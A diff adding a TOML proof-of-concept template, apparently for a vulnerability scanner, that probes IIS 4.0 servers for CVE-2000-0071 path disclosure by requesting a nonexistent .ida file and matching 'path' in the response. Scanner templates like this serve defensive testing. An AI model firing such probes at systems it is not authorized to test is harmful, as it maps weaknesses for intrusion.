@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "检验目标是否为IIS 4.0服务器，并通过请求不存在的文件（.ida或.idq扩展名）来验证是否存在路径泄露漏洞。若服务器返回包含路径信息的错误消息，则表示漏洞存在。"
+id = "POC-AVE-2000-0058"
+name = "CVE-2000-0071 PoC"
+severity = "medium"
+tags = ["ave-2000-0058"]
+vuln_id = [
+    "CVE-2000-0071",
+    "AVE-2000-0058",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/non_existent.ida"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["path"]
